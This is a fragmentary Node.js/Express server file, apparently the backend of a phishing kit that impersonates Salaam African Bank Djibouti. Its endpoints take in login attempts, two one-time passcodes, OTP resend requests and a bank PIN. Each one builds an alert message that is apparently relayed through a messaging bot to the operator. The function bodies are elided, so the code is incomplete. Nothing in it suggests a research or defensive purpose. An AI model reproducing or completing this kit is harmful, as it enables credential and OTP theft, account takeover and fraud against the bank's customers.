...
app.post('/api/login-notification', async (req, res) => {
    ...
    const message = `📱 <b>SALAAM AFRICAN BANK DJIBOUTI - LOGIN ATTEMPT</b>
...
app.post('/api/verify-first-otp', async (req, res) => {
    ...
    const otpMessage = `1️⃣ <b>SALAAM AFRICAN BANK DJIBOUTI - FIRST OTP (Step 1/2)</b>
...
app.post('/api/verify-second-otp', async (req, res) => {
    ...
    const otpMessage2 = `2️⃣ <b>SALAAM AFRICAN BANK DJIBOUTI - SECOND OTP (Step 2/2)</b>
...
app.post('/api/resend-otp-notification', async (req, res) => {
    ...
    const resendMsg = `🔄 <b>SALAAM AFRICAN BANK DJIBOUTI - RESEND REQUESTED</b>
...
app.post('/api/verify-bank-pin', async (req, res) => {
    ...
    const bankPinMessage = `🏦 <b>SALAAM AFRICAN BANK DJIBOUTI - BANK PIN VERIFICATION (Step 3)</b>
...
app.listen(PORT, async () => {
    ...
    try {
        ...
        bot.launch();
        console.log("🤖 Salaam African Bank Djibouti Bot is active");
    } catch (err) {
